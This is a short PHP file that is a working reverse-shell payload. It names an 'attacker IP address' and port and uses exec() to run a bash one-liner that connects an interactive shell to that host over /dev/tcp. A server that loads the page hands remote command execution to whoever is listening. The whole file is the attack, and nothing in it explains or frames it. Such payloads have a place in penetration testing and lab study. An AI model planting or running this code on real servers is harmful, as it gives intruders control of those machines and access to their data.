<?php
$ip = '192.168.0.57';  // attacker IP address
$port = 2727;      // attacker port number
$cmd = "/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";
exec($cmd);
?>

